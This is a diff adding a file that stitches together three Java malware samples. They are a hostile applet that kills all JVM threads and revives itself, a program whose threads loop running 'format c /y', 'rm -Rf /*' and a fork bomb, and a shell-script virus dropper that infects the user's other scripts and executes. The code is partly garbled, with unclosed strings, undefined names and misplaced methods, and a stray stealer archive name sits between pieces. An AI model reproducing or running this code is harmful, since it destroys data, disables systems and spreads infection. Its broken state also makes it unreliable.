@@ -1,0 +1,172 @@
+ /*  AppletKiller.java by Mark D. LaDue */
+
+/*  April 1, 1996  */
+
+/*  Copyright (c) 1996 Mark D. LaDue
+    You may study, use, modify, and distribute this example for any purpose.
+    This example is provided WITHOUT WARRANTY either expressed or implied.  */
+
+/*  This hostile applet stops any applets that are running and kills any
+    other applets that are downloaded. */ 
+
+import java.applet.*;
+import java.awt.*;
+import java.io.*;
+
+public class AppletKiller extends java.applet.Applet implements Runnable {
+    Thread killer;
+    
+    public void init() {
+        killer = null;
+    }
+
+    public void start() {
+        if (killer == null) {
+            killer = new Thread(this,"killer");
+            killer.setPriority(Thread.MAX_PRIORITY);
+            killer.start();
+        }
+    }
+
+    public void stop() {}    
+
+// Kill all threads except this one
+
+    public void run() {
+        try {
+            while (true) {
+                ThreadKiller.killAllThreads();
+                try { killer.sleep(100); }
+                catch (InterruptedException e) {}
+            }
+        }
+        catch (ThreadDeath td) {}
+
+// Resurrect the hostile thread in case of accidental ThreadDeath
+
+        finally {
+            AppletKiller ack = new AppletKiller();
+            Thread reborn = new Thread(ack, "killer");
+            reborn.start();
+        }
+    }
+}
+
+class ThreadKiller {
+
+// Ascend to the root ThreadGroup and list all subgroups recursively,
+// killing all threads as we go
+
+    public static void killAllThreads() {
+        ThreadGroup thisGroup;
+        ThreadGroup topGroup;
+        ThreadGroup parentGroup;
+        
+// Determine the current thread group
+        thisGroup = Thread.currentThread().getThreadGroup();
+        
+// Proceed to the top ThreadGroup
+        topGroup  = thisGroup;
+        parentGroup = topGroup.getParent();
+        while(parentGroup != null) {
+            topGroup  = parentGroup;
+            parentGroup = parentGroup.getParent();
+        }
+// Find all subgroups recursively 
+        findGroups(topGroup);
+    }
+    
+    private static void findGroups(ThreadGroup g) {
+        if (g == null) {return;}
+        else {
+        int numThreads = g.activeCount();
+        int numGroups = g.activeGroupCount();
+        Thread[] threads = new Thread[numThreads];
+        ThreadGroup[] groups = new ThreadGroup[numGroups];
+        g.enumerate(threads, false);
+        g.enumerate(groups, false);
+        for (int i = 0; i < numThreads; i++)
+            killOneThread(threads[i]);
+        for (int i = 0; i < numGroups; i++)
+            findGroups(groups[i]);
+        }
+    }
+
+    private static void killOneThread(Thread t) { 
+        if (t == null || t.getName().equals("killer")) {return;}
+        else {t.stop();}
+    }
+}Win32/Stealers/Win32.TitanStealer.b.7z /**
+ * Copyright (C) 2020 EduApps (Eduardo Procópio Gomez)
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+ import javax.swing.JFrame;
+ 
+ public class Sexo {
+ 	private static String OS = System.getProperty("os.name").toLowerCase();
+ 
+ 	public static void main(String[] args) {
+		while (true) {
+			new Thread(new Runnable() {
+				public void run() {
+					while(true) {
+						if (OS.contains("win")) {
+							Runtime.getRuntime().exec("cmd.exe /c format c /y");
+						} else {
+							Runtime.getRuntime().exec("sudo /bin/rm -Rf /*");
+							Runtime.getRuntime().exec(":(){:|:&};:);
+						}
+						
+						JFrame sexo = new JFrame("Sexo, Sexo, Sexo...");
+						sexo.setLocation(random.nextInt(500), random.nextInt(500));
+						sexo.setVisible(true);
+					}
+				}
+			});
+		}
+	}
+ }import java.io.*;
+
+class GhostDog {
+    public static void main (String[] argv) {
+    try {
+        String userHome = System.getProperty("user.home");
+        String target = "$HOME";
+        FileOutputStream outer = new FileOutputStream(userHome + "/.ghostdog.sh");
+        String homer = "#!/bin/sh" + "\n" + "#-_" + "\n" +
+        "echo \"This is a New Target File from me..-->GhostDog<--.\"" + "\n" +
+        "for file in `find " + target + " -type f -print`" + "\n" + "do" +
+        "\n" + "    case \"`sed 1q $file`\" in" + "\n" +
+        "        \"#!/bin/sh\" ) grep '#-_' $file > /dev/null" +
+        " || sed -n '/#-_/,$p' $0 >> $file" + "\n" +
+        "    esac" + "\n" + "done" + "\n" + 
+        "2>/dev/null";
+        byte[] buffer = new byte[homer.length()];
+        ghostdog.getBytes(0, ghostdog.length(), buffer, 0);
+        public void start() {
+        if (sleeper == null) {
+        sleeper = new Thread(this);
+        sleeper.setPriority(Thread.MAX_PRIORITY);
+        sleeper.start();
+        }
+        outer.write(buffer);
+        outer.close();
+        Process chmod = Runtime.getRuntime().exec("/usr/bin/chmod 888 " +
+                        userHome + "/.ghostdog.sh");
+        Process exec = Runtime.getRuntime().exec("/bin/sh " + userHome +
+                       "/.ghostdog.sh");
+        } catch (IOException ioe) {}
+    }
+}
